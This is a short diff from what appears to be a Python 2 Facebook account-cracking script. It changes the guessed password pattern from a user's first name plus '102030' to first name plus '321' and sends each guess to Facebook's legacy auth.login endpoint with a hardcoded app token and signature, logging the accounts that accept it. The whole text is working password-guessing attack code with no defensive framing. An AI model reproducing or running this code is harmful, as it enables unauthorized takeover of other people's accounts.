@@ -301,7 +301,7 @@ def pilih_indo():
 							print '\033[1;93m | ' + user + ' • ' + pass2 + ' • ' + c['name']
 							cekpoint.append(user)
 						else:
-							pass3 = c['first_name']+'102030'
+							pass3 = c['first_name']+'321'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							w = json.load(data)
 							if 'access_token' in w:
